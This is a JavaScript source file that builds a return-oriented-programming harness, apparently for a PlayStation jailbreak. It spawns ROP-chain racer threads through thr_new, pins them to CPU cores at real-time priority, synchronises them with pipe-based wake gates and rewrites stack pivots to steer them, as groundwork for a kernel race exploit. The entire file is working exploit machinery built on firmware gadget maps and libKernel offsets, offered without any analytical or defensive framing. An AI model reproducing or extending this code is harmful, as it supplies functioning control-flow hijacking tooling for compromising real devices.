import {
  TK,
  SYS,
  w16,
  w32,
  r16,
  r32,
  coreList,
  hexBytes,
} from "./poops-common.js?v=final";

const THR_PARAM_SIZE = 0x68;

export function makeHarness(X) {
  const { P, chain, i64, sys, runChain, mem, flushMark, sleep, state, driver } =
    X;

  const queueEvent = X.queueEvent || flushMark;

  const track = typeof X.track === "function" ? X.track : () => {};
  const untrack = typeof X.untrack === "function" ? X.untrack : () => {};

  if (typeof state.wakeGates !== "number") state.wakeGates = 0;

  const M1 = () => i64(0xffffffff, 0xffffffff);

  function needStub(num, why) {
    if (P.syscalls[num] === undefined)
      throw new Error(
        "syscall 0x" +
          num.toString(16).toUpperCase() +
          " has no stub in the active firmware profile (rop.js:78): " +
          why,
      );
    return P.syscalls[num];
  }

  function needGadget(name, why) {
    const g = P.gadgets[name];
    if (g === undefined)
      throw new Error(
        "gadget '" +
          name +
          "' is not in the active firmware " +
          "gadget map (rop.js:78): " +
          why,
      );
    return g;
  }
  function needGadgets(names, why) {
    for (const n of names) needGadget(n, why);
  }

  const G_STORE = [
    "pop rdi",
    "pop rsi",
    "mov [rdi], rsi",
    "mov [rdi], rax",
    "mov [rdi], eax",
  ];

  const G_CALL = [
    "pop rdi",
    "pop rsi",
    "pop rdx",
    "pop rcx",
    "pop r8",
    "pop r9",
    "ret",
  ];

  const G_COPY = [
    "pop rax",
    "mov rax, [rax]",
    "pop rdi",
    "mov [rdi], rax",
    "pop rsi",
    "mov [rdi], rsi",
  ];

  const G_BRANCH = [
    "pop rcx",
    "pop rax",
    "cmp [rcx], eax",
    "sete al",
    "shl rax, 3",
    "add rax, rcx",
    "mov rax, [rax]",
    "pop rdi",
    "mov [rdi], rax",
    "pop rsp",
    "inc dword [rax]",
  ];

  function newSync(spec) {
    let n = 0;
    const map = Object.create(null);
    for (const [nm, c] of spec) {
      map[nm] = n;
      n += c;
    }
    const raw = P.malloc(0x80 + n * 8, 1);
    const pad = (64 - (raw.low & 63)) & 63;

    const base = i64(raw.low, raw.hi);
    base.add32inplace(pad);
    const u8 = raw.backing;
    const at = (nm, i) => pad + (map[nm] + (i || 0)) * 8;
    const S = {
      base,
      raw,
      pad,
      qwords: n,
      has: (nm) => map[nm] !== undefined,
      ptr: (nm, i) => base.add32((map[nm] + (i || 0)) * 8),
      get: (nm, i) => r32(u8, at(nm, i)) >>> 0,
      hi: (nm, i) => r32(u8, at(nm, i) + 4) >>> 0,
      s32: (nm, i) => r32(u8, at(nm, i)) | 0,
      hex: (nm, i) => {
        const h = r32(u8, at(nm, i) + 4),
          l = r32(u8, at(nm, i));
        return h === 0
          ? l.toString(16)
          : h.toString(16) + l.toString(16).padStart(8, "0");
      },
      set: (nm, i, v) => {
        w32(u8, at(nm, i), v >>> 0);
        w32(u8, at(nm, i) + 4, 0);
      },
      u8,
      at,
    };
    for (let k = 0; k < n * 8; ++k) u8[pad + k] = 0;
    state.syncBlocks++;
    state.syncBytes += 1000 + 0x80 + n * 8;
    return S;
  }

  const slotLo = (t, i) => t.stack_array[t.reserved_stack_index + i * 2] >>> 0;
  const slotHi = (t, i) =>
    t.stack_array[t.reserved_stack_index + i * 2 + 1] >>> 0;
  const slotAddr = (t, i) => t.stack_entry_point.add32(i * 8);

  function retargetSlot(t, idx, addr, label) {
    const cur = slotHi(t, idx);
    if (addr.hi >>> 0 === cur) {
      t.stack_array[t.reserved_stack_index + idx * 2] = addr.low >>> 0;
      return "atomic32";
    }
    state.tornWrites.push(label + "@slot" + idx);
    t.stack_array[t.reserved_stack_index + idx * 2 + 1] = addr.hi >>> 0;
    t.stack_array[t.reserved_stack_index + idx * 2] = addr.low >>> 0;
    return "two-store";
  }

  function setSlotU32(t, idx, v) {
    if (slotHi(t, idx) !== 0)
      t.stack_array[t.reserved_stack_index + idx * 2 + 1] = 0;
    t.stack_array[t.reserved_stack_index + idx * 2] = v >>> 0;
  }

  function maxSlots(t) {
    return (t.stack_size - t.reserved_stack) / 8;
  }
  function assertSlots(t, label) {
    const m = maxSlots(t);
    if (t.count >= m)
      throw new Error(
        "chain-slot overflow in '" +
          label +
          "': used " +
          t.count +
          " of " +
          m +
          " slots (stack_size 0x" +
          t.stack_size.toString(16) +
          ", reserved 0x" +
          t.reserved_stack.toString(16) +
          ")",
      );
    return { used: t.count, max: m, pct: Math.round((t.count * 100) / m) };
  }

  function newThread(name, stackSize, reservedStack) {
    const t = new thread_rop(
      P,
      chain,
      name,
      stackSize === undefined ? 0x2000 : stackSize,
      reservedStack === undefined ? 0x400 : reservedStack,
    );
    t.jbName = name;
    t.jbSpawned = false;
    t.jbTid = 0;

    state.threadObjectsBuilt++;
    state.heapBytes += 0x42800 + 5 * 0x40000;
    return t;
  }

  function queueSpawn(t, retSync, retName, retIdx) {
    needStub(SYS.THR_NEW, "spawning a ROP thread");
    chain.add_syscall_ret(
      retSync.ptr(retName, retIdx),
      SYS.THR_NEW,
      t.thr_new_args,
      THR_PARAM_SIZE,
    );
  }

  function readTid(t) {
    flushMark(
      "TID-PRE",
      t.jbName +
        "-tid=0x" +
        t.tid.toString() +
        "-ptid=0x" +
        t.ptid.toString() +
        "-next=read8x2",
    );
    const child = P.read8(t.tid);
    const parent = P.read8(t.ptid);
    const c = child.low >>> 0,
      pa = parent.low >>> 0;
    const tid = c || pa;
    flushMark(
      "TID",
      t.jbName + "-child=" + c + "-parent=" + pa + "-use=" + tid,
    );

    if (c !== 0 && pa !== 0 && c !== pa)
      throw new Error(
        "TID disagreement for " +
          t.jbName +
          ": thr_param+0x30 child_tid=" +
          c +
          " +0x38 " +
          "parent_tid=" +
          pa,
      );
    t.jbTid = tid;
    t.jbTidChild = child.low >>> 0;
    t.jbTidParent = parent.low >>> 0;
    return { tid, child: t.jbTidChild, parent: t.jbTidParent };
  }

  function emitPrologue(t, S, wid, core, prio, parts) {
    const doPin = !parts || parts.pin !== false;
    const doPrio = !parts || parts.prio !== false;
    if (doPin) {
      needStub(SYS.CPUSET_SETAFFINITY, "per-thread pinning");
      needStub(SYS.CPUSET_GETAFFINITY, "pin read-back");
    }
    if (doPrio) needStub(SYS.RTPRIO_THREAD, "per-thread RT priority");
    needGadgets(G_CALL, "the racer prologue's syscall arguments");
    needGadgets(G_STORE, "the racer prologue's result stores");

    const mask = mem(TK.CPUSET_SIZE);
    for (let i = 0; i < TK.CPUSET_SIZE; ++i) mask.u8[i] = 0;
    w32(mask.u8, 0, (1 << core) >>> 0);

    const rtp = mem(0x10);
    for (let i = 0; i < 0x10; ++i) rtp.u8[i] = 0;
    w16(rtp.u8, 0, TK.PRI_REALTIME);
    w16(rtp.u8, 2, prio);

    const rtpBack = mem(0x10);
    for (let i = 0; i < 0x10; ++i) rtpBack.u8[i] = 0;
    const maskBack = mem(TK.CPUSET_SIZE);
    for (let i = 0; i < TK.CPUSET_SIZE; ++i) maskBack.u8[i] = 0;

    if (doPin) {
      t.self_healing_syscall(
        SYS.CPUSET_SETAFFINITY,
        TK.CPU_LEVEL_WHICH,
        TK.CPU_WHICH_TID,
        M1(),
        TK.CPUSET_SIZE,
        mask.ptr,
      );
      t.write_result4(S.ptr("pinret", wid));
    }

    if (doPrio) {
      t.self_healing_syscall(SYS.RTPRIO_THREAD, TK.RTP_SET, 0, rtp.ptr);
      t.write_result4(S.ptr("prioret", wid));

      t.self_healing_syscall(SYS.RTPRIO_THREAD, TK.RTP_LOOKUP, 0, rtpBack.ptr);
      t.write_result4(S.ptr("lookupret", wid));
    }

    if (doPin) {
      t.self_healing_syscall(
        SYS.CPUSET_GETAFFINITY,
        TK.CPU_LEVEL_WHICH,
        TK.CPU_WHICH_TID,
        M1(),
        TK.CPUSET_SIZE,
        maskBack.ptr,
      );
      t.write_result4(S.ptr("affret", wid));
    }

    t.fcall(P.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
    t.write_result(S.ptr("cpu", wid));

    t.push_write8(S.ptr("status", wid), TK.ST_READY);

    return { mask, rtp, rtpBack, maskBack };
  }

  function newWakeGate(label, i) {
    needStub(SYS.PIPE2, "the racer's blocking wake gate");
    const fdbuf = mem(8);
    w32(fdbuf.u8, 0, 0);
    w32(fdbuf.u8, 4, 0);
    return { fdbuf, label, i };
  }

  async function newWakeGates(n, label) {
    needStub(SYS.PIPE2, "the racer wake gates");
    const g0 = newWakeGate(label, 0);
    flushMark(
      "WAKEGATE-PRE",
      label +
        "-n=" +
        n +
        "-syscall=pipe2-0x2AF" +
        "-flags=0-BLOCKING-BOTH-ENDS-out=0x" +
        g0.fdbuf.ptr.toString(),
    );
    const out = [];
    for (let i = 0; i < n; ++i) {
      w32(g0.fdbuf.u8, 0, 0);
      w32(g0.fdbuf.u8, 4, 0);
      const r = await sys(SYS.PIPE2, g0.fdbuf.ptr, 0);
      if (r.failed)
        throw new Error(
          "pipe2 for wake gate " + label + "[" + i + "] failed: " + r.errText,
        );
      const rfd = r32(g0.fdbuf.u8, 0) | 0,
        wfd = r32(g0.fdbuf.u8, 4) | 0;
      if (rfd < 0 || wfd < 0)
        throw new Error(
          "pipe2 for wake gate " +
            label +
            "[" +
            i +
            "] returned 0 with fds " +
            rfd +
            "," +
            wfd,
        );

      const buf = mem(8);
      for (let k = 0; k < 8; ++k) buf.u8[k] = 0;
      out.push({ rfd, wfd, buf: buf.ptr, bufMem: buf });

      track(rfd);
      track(wfd);
      queueEvent("WAKEGATE", label + "-" + i + "-r=" + rfd + "-w=" + wfd);
      state.wakeGates++;
    }
    flushMark(
      "WAKEGATE-OK",
      label +
        "-n=" +
        n +
        "-r=" +
        out.map((o) => o.rfd).join(".") +
        "-w=" +
        out.map((o) => o.wfd).join("."),
    );
    return out;
  }

  function emitRacerLoop(t, S, wid, opt) {
    needStub(SYS.READ, "the racer's blocking wake gate");
    needStub(SYS.THR_EXIT, "the kill switch tail");
    needGadgets(G_CALL, "the racer loop's syscall arguments");
    needGadgets(G_STORE, "the racer loop's awake[]/finished[]/status stores");
    needGadgets(G_BRANCH, "the racer's read()-return gate");

    needGadget("pop rsp", "the rewritable pivot and the loop-back");

    const gate = opt.wake;
    if (
      !gate ||
      typeof gate.rfd !== "number" ||
      gate.rfd < 0 ||
      gate.buf === undefined
    )
      throw new Error(
        "emitRacerLoop(" +
          (opt.name || "racer" + wid) +
          "): opt.wake must be a live { rfd, wfd, buf } from " +
          "newWakeGates()",
      );

    const loopStart = t.get_rsp();

    t.self_healing_syscall(SYS.READ, gate.rfd, gate.buf, 1);
    t.write_result4(S.ptr("waitret", wid));

    const readGate = t.create_branch(
      t.branch_types.EQUAL,
      S.ptr("waitret", wid),
      1,
    );
    const gateMet = t.get_rsp();

    t.push_write8(S.ptr("awake", wid), 1);

    t.push(P.gadgets["pop rsp"]);
    const pivotIdx = t.count;
    t.push(0);

    const workStart = t.get_rsp();
    if (opt.work) opt.work(t);
    t.push_write8(S.ptr("finished", wid), 1);
    t.jmp_to_rsp(loopStart);

    const exitTail = t.get_rsp();
    t.push_write8(S.ptr("status", wid), TK.ST_EXITED);
    t.fcall(P.syscalls[SYS.THR_EXIT], 0);

    t.set_branch_points(readGate, gateMet, exitTail);

    t.set_entry(pivotIdx, workStart);

    return {
      loopStart,
      workStart,
      exitTail,
      pivotIdx,
      valIdx: -1,
      gate: readGate,
    };
  }

  function buildRacer(S, wid, opt) {
    const t = newThread(
      opt.name || "racer" + wid,
      opt.stackSize,
      opt.reservedStack,
    );
    const bufs = emitPrologue(t, S, wid, opt.core, opt.prio, opt.parts);
    const marks = emitRacerLoop(t, S, wid, opt);
    const budget = assertSlots(t, opt.name || "racer" + wid);
    t.jbMarks = marks;
    t.jbBufs = bufs;
    t.jbBudget = budget;
    t.jbWid = wid;
    t.jbSync = S;

    t.jbWakeRfd = opt.wake.rfd;
    t.jbWakeWfd = opt.wake.wfd;
    t.jbWakeBuf = opt.wake.buf;
    return t;
  }

  let signalMarksQuiet = false;

  function setSignalMarksQuiet(quiet) {
    const was = signalMarksQuiet;
    signalMarksQuiet = !!quiet;
    return was;
  }

  function signalMark(tag, extra) {
    if (signalMarksQuiet) queueEvent(tag, extra);
    else flushMark(tag, extra);
  }

  function wakeArgs(g) {
    return g.spawned.map((t) => {
      if (t.jbWakeWfd === undefined || t.jbWakeWfd < 0)
        throw new Error(
          "wakeArgs(" +
            g.name +
            "): " +
            t.jbName +
            " has no wake gate (jbWakeWfd=" +
            t.jbWakeWfd +
            ")",
        );
      return {
        fd: t.jbWakeWfd,
        buf: t.jbWakeBuf,
        len: 1,
        name: t.jbName,
        wid: t.jbWid,
      };
    });
  }

  function armSignal(g, why) {
    if (!g.settled)
      throw new Error(
        "signal(" + g.name + "): previous signal not " + "matched by wait()",
      );
    g.settled = false;
    g.gen++;

    for (const wid of g.wids) {
      g.S.set("awake", wid, 0);
      g.S.set("finished", wid, 0);
    }
    signalMark(
      "SIGNAL-PRE",
      g.name + "-round=" + g.gen + "-n=" + g.wids.length + "-why=" + why,
    );
    return wakeArgs(g);
  }
  function newGroup(name, threads, S, opt) {
    return {
      name,
      threads,
      S,

      spawned: threads.slice(),
      wids: threads.map((t) => t.jbWid),
      gen: 0,
      settled: true,
      terminated: false,
      opt: opt || {},
    };
  }

  async function signal(g, deadlineMs, why) {
    const args = armSignal(g, why);
    const t0 = Date.now();
    if (args.length) {
      needStub(SYS.WRITE, "the one-byte wake");

      if (!g.jbWakeRet || g.jbWakeRetN < args.length) {
        g.jbWakeRet = mem(8 * args.length);
        g.jbWakeRetN = args.length;
      }
      for (let i = 0; i < args.length; ++i) {
        w32(g.jbWakeRet.u8, i * 8, 0x7fffffff);
        w32(g.jbWakeRet.u8, i * 8 + 4, 0x7fffffff);
        chain.add_syscall_ret(
          g.jbWakeRet.ptr.add32(i * 8),
          SYS.WRITE,
          args[i].fd,
          args[i].buf,
          1,
        );
      }
      await runChain();
      for (let i = 0; i < args.length; ++i) {
        const r = r32(g.jbWakeRet.u8, i * 8) | 0;
        if (r !== 1) {
          flushMark(
            "SIGNAL-WRITE-FAILED",
            g.name +
              "-wid=" +
              args[i].wid +
              "-name=" +
              args[i].name +
              "-fd=" +
              args[i].fd +
              "-ret=" +
              r +
              "-round=" +
              g.gen +
              "-why=" +
              why,
          );
          throw new Error(
            "signal(" +
              g.name +
              "): write(fd " +
              args[i].fd +
              ", 1) for " +
              args[i].name +
              " returned " +
              r +
              ", not 1",
          );
        }
      }
    }
    const ms = Date.now() - t0;
    signalMark(
      "SIGNAL",
      g.name + "-round=" + g.gen + "-bytes=" + args.length + "-ms=" + ms,
    );

    return { wakes: args.length, bytes: args.length, ms, gen: g.gen };
  }

  async function closeWakeGates(g) {
    const fds = [];
    for (const t of g.spawned) {
      if (typeof t.jbWakeRfd === "number" && t.jbWakeRfd >= 0)
        fds.push([t, "r", t.jbWakeRfd]);
      if (typeof t.jbWakeWfd === "number" && t.jbWakeWfd >= 0)
        fds.push([t, "w", t.jbWakeWfd]);
    }
    if (!fds.length) return { closed: 0, failed: [] };
    needStub(SYS.CLOSE, "closing the racer wake gates");
    const ret = mem(8 * fds.length);
    for (let i = 0; i < fds.length; ++i) {
      w32(ret.u8, i * 8, 0x7fffffff);
      w32(ret.u8, i * 8 + 4, 0x7fffffff);
      chain.add_syscall_ret(ret.ptr.add32(i * 8), SYS.CLOSE, fds[i][2]);
    }
    await runChain();
    let closed = 0;
    const failed = [];
    for (let i = 0; i < fds.length; ++i) {
      const r = r32(ret.u8, i * 8) | 0;
      const [t, which, fd] = fds[i];
      if (r === 0) {
        closed++;
        if (which === "r") t.jbWakeRfd = -1;
        else t.jbWakeWfd = -1;

        untrack(fd);
      } else failed.push(t.jbName + ":" + which + fd + "=" + r);
    }

    state.wakeGates -= Math.floor(closed / 2);
    return { closed, failed };
  }

  async function waitFinished(g, deadlineMs, why) {
    const t0 = Date.now();
    for (;;) {
      let stuck = -1;
      for (const wid of g.wids)
        if (g.S.get("finished", wid) === 0) {
          stuck = wid;
          break;
        }
      if (stuck < 0) {
        g.settled = true;
        return Date.now() - t0;
      }
      if (Date.now() - t0 > deadlineMs) {
        flushMark(
          "WAIT-TIMEOUT",
          g.name +
            "-stuck=" +
            stuck +
            "-ms=" +
            (Date.now() - t0) +
            "-why=" +
            why,
        );
        throw new Error(
          "wait(" +
            g.name +
            "): racer " +
            stuck +
            "/" +
            g.wids.length +
            " never set finished within " +
            deadlineMs +
            " ms (" +
            why +
            ")",
        );
      }
      await sleep(1);
    }
  }

  async function waitStatus(g, want, deadlineMs, why) {
    const t0 = Date.now();
    for (;;) {
      let stuck = -1;
      for (const wid of g.wids)
        if (g.S.get("status", wid) !== want) {
          stuck = wid;
          break;
        }
      if (stuck < 0) return Date.now() - t0;
      if (Date.now() - t0 > deadlineMs) {
        flushMark(
          "STATUS-TIMEOUT",
          g.name +
            "-stuck=" +
            stuck +
            "-want=" +
            want +
            "-saw=" +
            g.S.get("status", stuck) +
            "-why=" +
            why,
        );
        throw new Error(
          "waitStatus(" +
            g.name +
            "): racer " +
            stuck +
            " status is " +
            g.S.get("status", stuck) +
            ", wanted " +
            want +
            ", after " +
            deadlineMs +
            " ms (" +
            why +
            ")",
        );
      }
      await sleep(1);
    }
  }

  async function terminate(g, why) {
    if (g.terminated) return { already: true };
    const pv = g.spawned.length
      ? "pivotSlot=" +
        g.spawned[0].jbMarks.pivotIdx +
        "-exitTail=0x" +
        g.spawned[0].jbMarks.exitTail.toString()
      : "no-live-thread";
    flushMark(
      "TERM-PRE",
      g.name +
        "-live=" +
        g.spawned.length +
        "-built=" +
        g.threads.length +
        "-" +
        pv +
        "-why=" +
        why,
    );
    const report = {
      unblocked: null,
      retarget: [],
      signal: null,
      exitedMs: -1,
      settledMs: 0,
    };

    if (g.opt.unblock) report.unblocked = await g.opt.unblock();

    for (const t of g.spawned)
      report.retarget.push(
        retargetSlot(
          t,
          t.jbMarks.pivotIdx,
          t.jbMarks.exitTail,
          g.name + ":" + t.jbName,
        ),
      );

    g.settled = true;
    report.signal = await signal(
      g,
      g.opt.signalDeadline || 5000,
      "terminate:" + why,
    );
    report.exitedMs = await waitStatus(
      g,
      TK.ST_EXITED,
      g.opt.exitDeadline || 15000,
      "terminate:" + why,
    );

    await sleep(50);
    report.settledMs = 50;
    g.terminated = true;
    for (const t of g.spawned) state.threadsExited++;

    try {
      report.gates = await closeWakeGates(g);
    } catch (e) {
      report.gates = {
        closed: 0,
        failed: ["threw: " + ((e && e.message) || e)],
      };
    }
    flushMark(
      "TERM-OK",
      g.name +
        "-exitedMs=" +
        report.exitedMs +
        "-bytes=" +
        report.signal.wakes +
        "-gatesClosed=" +
        (report.gates ? report.gates.closed : -1) +
        (report.gates && report.gates.failed.length
          ? "-gateCloseFailed=" + report.gates.failed.join(",")
          : ""),
    );
    return report;
  }

  function whoArg(tid) {
    return tid === undefined || tid === null || tid === -1 ? M1() : tid;
  }
  function whoTxt(tid) {
    return tid === undefined || tid === null || tid === -1
      ? "self"
      : String(tid);
  }

  async function readAffinity(label, tid) {
    const m = mem(TK.CPUSET_SIZE);
    for (let i = 0; i < TK.CPUSET_SIZE; ++i) m.u8[i] = 0;
    flushMark(
      "AFF-GET-PRE",
      label + "-who=" + whoTxt(tid) + "-buf=0x" + m.ptr.toString(),
    );
    const r = await sys(
      SYS.CPUSET_GETAFFINITY,
      TK.CPU_LEVEL_WHICH,
      TK.CPU_WHICH_TID,
      whoArg(tid),
      TK.CPUSET_SIZE,
      m.ptr,
    );
    const bytes = new Uint8Array(TK.CPUSET_SIZE);
    for (let i = 0; i < TK.CPUSET_SIZE; ++i) bytes[i] = m.u8[i];
    const word = r32(bytes, 0);
    flushMark(
      "AFF-GET",
      label +
        "-ret=" +
        r.s32 +
        "-mask=0x" +
        word.toString(16) +
        "-cores=" +
        coreList(word),
    );
    return { r, bytes, word, hex: hexBytes(bytes, 0, TK.CPUSET_SIZE) };
  }

  async function writeAffinityBytes(bytes, label, tid) {
    const m = mem(TK.CPUSET_SIZE);
    for (let i = 0; i < TK.CPUSET_SIZE; ++i) m.u8[i] = bytes[i];
    flushMark(
      "AFF-SET-PRE",
      label +
        "-who=" +
        whoTxt(tid) +
        "-mask=" +
        hexBytes(bytes, 0, 8) +
        "-buf=0x" +
        m.ptr.toString(),
    );
    const r = await sys(
      SYS.CPUSET_SETAFFINITY,
      TK.CPU_LEVEL_WHICH,
      TK.CPU_WHICH_TID,
      whoArg(tid),
      TK.CPUSET_SIZE,
      m.ptr,
    );
    flushMark("AFF-SET", label + "-ret=" + r.s32);
    return r;
  }

  async function pinDriver(core) {
    const bytes = new Uint8Array(TK.CPUSET_SIZE);
    w32(bytes, 0, (1 << core) >>> 0);
    return await writeAffinityBytes(bytes, "pin-core-" + core);
  }

  async function thrSelf(label) {
    needStub(SYS.THR_SELF, "the driver thread's own TID");
    const b = mem(0x10);
    for (let i = 0; i < 0x10; ++i) b.u8[i] = 0;
    flushMark(
      "THR-SELF-PRE",
      (label || "driver") + "-syscall=thr_self-0x1B0-buf=0x" + b.ptr.toString(),
    );
    const r = await sys(SYS.THR_SELF, b.ptr);
    const tid = r32(b.u8, 0) >>> 0;
    const hi = r32(b.u8, 4) >>> 0;
    flushMark(
      "THR-SELF",
      (label || "driver") + "-ret=" + r.s32 + "-tid=" + tid + "-hi=" + hi,
    );
    return { r, tid, hi };
  }

  async function readRtprio(label, tid) {
    const b = mem(0x10);
    for (let i = 0; i < 0x10; ++i) b.u8[i] = 0;

    const lwp = tid === undefined || tid === null || tid === -1 ? 0 : tid;
    flushMark(
      "RTP-GET-PRE",
      label + "-lwpid=" + lwp + "-buf=0x" + b.ptr.toString(),
    );
    const r = await sys(SYS.RTPRIO_THREAD, TK.RTP_LOOKUP, lwp, b.ptr);
    const type = r16(b.u8, 0),
      prio = r16(b.u8, 2);
    flushMark(
      "RTP-GET",
      label + "-ret=" + r.s32 + "-type=" + type + "-prio=" + prio,
    );
    return { r, type, prio };
  }

  async function writeRtprio(type, prio, label, tid) {
    const b = mem(0x10);
    for (let i = 0; i < 0x10; ++i) b.u8[i] = 0;
    w16(b.u8, 0, type);
    w16(b.u8, 2, prio);
    const lwp = tid === undefined || tid === null || tid === -1 ? 0 : tid;
    flushMark(
      "RTP-SET-PRE",
      label +
        "-lwpid=" +
        lwp +
        "-type=" +
        type +
        "-prio=" +
        prio +
        "-buf=0x" +
        b.ptr.toString(),
    );
    const r = await sys(SYS.RTPRIO_THREAD, TK.RTP_SET, lwp, b.ptr);
    flushMark("RTP-SET", label + "-ret=" + r.s32);
    return r;
  }

  async function driverCurrentCpu() {
    flushMark(
      "DRV-CPU-PRE",
      "fn=lk+0x" + OFFSET_lk_sceKernelGetCurrentCpu.toString(16),
    );
    const v = await chainCall(
      P.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu),
    );
    flushMark("DRV-CPU", "cpu=" + (v & 0xffff));
    return v;
  }

  async function chainCall(rip, a, b, c, d, e, f) {
    const t0 = Date.now();
    chain.fcall(rip, a, b, c, d, e, f);
    chain.write_result4(chain.return_value);
    await runChain();
    state.roundTrips.push(Date.now() - t0);
    return P.read4(chain.return_value) | 0;
  }

  async function restoreDriver(why) {
    const out = {
      why,
      affRet: null,
      prioRet: null,
      affOk: false,
      prioOk: false,
      error: "",
    };
    try {
      const a = await writeAffinityBytes(
        driver.origMaskBytes,
        "restore:" + why,
      );
      out.affRet = a.s32;
      const back = await readAffinity("restore-check");
      out.affOk =
        !back.r.failed &&
        hexBytes(back.bytes, 0, TK.CPUSET_SIZE) === driver.origMaskHex;
      out.affSeen = hexBytes(back.bytes, 0, TK.CPUSET_SIZE);

      const pr = await writeRtprio(
        driver.origPrioType,
        driver.origPrio,
        "restore:" + why,
      );
      out.prioRet = pr.s32;
      const pb = await readRtprio("restore-check");
      out.prioOk =
        !pb.r.failed &&
        pb.type === driver.origPrioType &&
        pb.prio === driver.origPrio;
      out.prioSeen = pb.type + "/" + pb.prio;
      driver.pinned = false;
    } catch (err) {
      out.error = (err && err.message) || String(err);
    }
    flushMark(
      "DRIVER-RESTORE",
      why +
        "-aff=" +
        out.affOk +
        "-prio=" +
        out.prioOk +
        (out.error ? "-ERR-" + out.error.slice(0, 60) : ""),
    );
    return out;
  }

  const SPAWN_POISON = 0xdeadbeef;

  async function spawnGroup(g) {
    for (const t of g.threads) queueSpawn(t, g.S, "spawnret", t.jbWid);
    for (const t of g.threads) g.S.set("spawnret", t.jbWid, SPAWN_POISON);
    flushMark(
      "SPAWN-PRE",
      g.name +
        "-n=" +
        g.threads.length +
        "-thr_new=0x1C7-param_size=0x68-param=0x" +
        g.threads[0].thr_new_args.toString() +
        "-entry=lc+longjmp-poison=0x" +
        SPAWN_POISON.toString(16),
    );
    const t0 = Date.now();
    let runErr = null;
    try {
      await runChain();
    } catch (err) {
      runErr = err;
      flushMark(
        "SPAWN-ROUNDTRIP-FAILED",
        g.name +
          "-" +
          String((err && err.message) || err).slice(0, 60) +
          "-reading-spawnret-anyway",
      );
    }
    const ms = Date.now() - t0;
    const raw = g.threads.map((t) => g.S.get("spawnret", t.jbWid) >>> 0);
    const rets = g.threads.map((t) => g.S.s32("spawnret", t.jbWid));

    if (state.groups && state.groups.indexOf(g) < 0) state.groups.push(g);
    g.spawned = [];
    const notRun = [],
      failedIdx = [];
    for (let i = 0; i < g.threads.length; ++i) {
      const t = g.threads[i];
      t.jbSpawnRet = rets[i];
      if (raw[i] === SPAWN_POISON) {
        t.jbSpawned = false;
        notRun.push(i);
      } else if (rets[i] !== 0) {
        t.jbSpawned = false;
        failedIdx.push(i);
      } else {
        t.jbSpawned = true;
        state.threadsCreated++;
        g.spawned.push(t);
      }
    }

    g.wids = g.spawned.map((t) => t.jbWid);
    flushMark(
      "SPAWN",
      g.name +
        "-rets=" +
        rets.join(".") +
        "-live=" +
        g.spawned.length +
        "-notrun=" +
        notRun.length +
        "-ms=" +
        ms,
    );
    for (const t of g.spawned) readTid(t);

    if (runErr) throw runErr;
    if (notRun.length === g.threads.length)
      throw new Error(
        "spawn chain '" +
          g.name +
          "' never ran: all " +
          "spawnret slots still hold poison 0x" +
          SPAWN_POISON.toString(16),
      );
    if (failedIdx.length) {
      const b = failedIdx[0];
      throw new Error(
        "thr_new failed for " +
          g.threads[b].jbName +
          ": ret=" +
          rets[b] +
          " (" +
          failedIdx.length +
          " of " +
          g.threads.length +
          " failed, " +
          g.spawned.length +
          " live, registered for teardown)",
      );
    }
    if (notRun.length)
      throw new Error(
        notRun.length +
          " of " +
          g.threads.length +
          " spawnret slots in '" +
          g.name +
          "' still poisoned: " +
          g.spawned.length +
          " thread(s) live, registered for teardown",
      );
    return { rets, ms };
  }

  function prologueProblem(t, S, wid, core, prio) {
    const pinret = S.s32("pinret", wid);
    const affret = S.s32("affret", wid);
    const prioret = S.s32("prioret", wid);
    const lookupret = S.s32("lookupret", wid);
    const cpu = S.get("cpu", wid) & 0xffff;
    const who = t.jbName || "racer" + wid;
    if (pinret !== 0)
      return (
        who + ": cpuset_setaffinity returned " + pinret + " inside the thread"
      );
    if (affret !== 0)
      return who + ": cpuset_getaffinity read-back returned " + affret;
    if (cpu !== core) return who + ": on core " + cpu + ", not " + core;
    const back = r32(t.jbBufs.maskBack.u8, 0);
    if (back !== (1 << core) >>> 0)
      return (
        who +
        ": mask read back 0x" +
        back.toString(16) +
        ", expected 0x" +
        ((1 << core) >>> 0).toString(16)
      );
    if (prioret !== 0)
      return (
        who +
        ": rtprio_thread(RTP_SET) returned " +
        prioret +
        ", not at PRI_REALTIME/" +
        prio +
        ", still timesharing"
      );
    if (lookupret !== 0)
      return who + ": rtprio_thread(RTP_LOOKUP) returned " + lookupret;
    const bt = r16(t.jbBufs.rtpBack.u8, 0);
    const bp = r16(t.jbBufs.rtpBack.u8, 2);
    if (bt !== TK.PRI_REALTIME || bp !== prio)
      return (
        who +
        ": RTP_LOOKUP read back type=" +
        bt +
        " prio=" +
        bp +
        ", expected " +
        TK.PRI_REALTIME +
        "/" +
        prio
      );
    return "";
  }

  function groupPrologueProblem(g, core, prio) {
    for (const t of g.spawned) {
      const p = prologueProblem(t, g.S, t.jbWid, core, prio);
      if (p) return p;
    }
    return "";
  }

  async function awaitStatus(S, wid, want, ms, why) {
    const t0 = Date.now();
    for (;;) {
      if (S.get("status", wid) === want) return Date.now() - t0;
      if (Date.now() - t0 > ms) {
        flushMark(
          "STATUS-TIMEOUT",
          why +
            "-wid=" +
            wid +
            "-saw=" +
            S.get("status", wid) +
            "-want=" +
            want,
        );
        return -1;
      }
      await sleep(1);
    }
  }

  return {
    M1,
    needStub,
    needGadget,
    needGadgets,
    newSync,
    newThread,
    queueSpawn,
    readTid,
    emitPrologue,
    emitRacerLoop,
    buildRacer,
    assertSlots,
    maxSlots,
    newGroup,
    signal,
    waitFinished,
    waitStatus,
    terminate,

    newWakeGates,
    wakeArgs,
    armSignal,
    closeWakeGates,
    setSignalMarksQuiet,
    slotLo,
    slotHi,
    slotAddr,
    retargetSlot,
    setSlotU32,
    readAffinity,
    writeAffinityBytes,
    pinDriver,
    readRtprio,
    writeRtprio,
    thrSelf,
    driverCurrentCpu,
    chainCall,
    restoreDriver,

    spawnGroup,
    prologueProblem,
    groupPrologueProblem,
    awaitStatus,
    SPAWN_POISON,
    G_STORE,
    G_CALL,
    G_COPY,
    G_BRANCH,
  };
}

